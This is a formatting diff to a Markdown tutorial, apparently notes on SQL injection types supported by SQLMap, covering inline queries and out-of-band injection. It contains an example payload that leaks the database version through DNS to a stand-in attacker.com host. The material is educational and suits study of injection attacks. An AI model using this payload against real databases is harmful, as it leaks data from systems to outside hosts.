@@ -250,19 +250,23 @@ The principle of `Time-based blind SQL Injection` is similar to the `Boolean-
 
 Example of `Inline Queries`:
 
-SQL
+```SQL
 `SELECT (SELECT @@version) from`
+```
 
 This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.
+<div align="center">
+<br>
+<br>
+</div>
 
----
-
-## Out-of-band SQL Injection
+#### Out-of-band SQL Injection
 
 Example of `Out-of-band SQL Injection`:
 
-        SQL
+```SQL
 `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
+```
 
 This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.
 
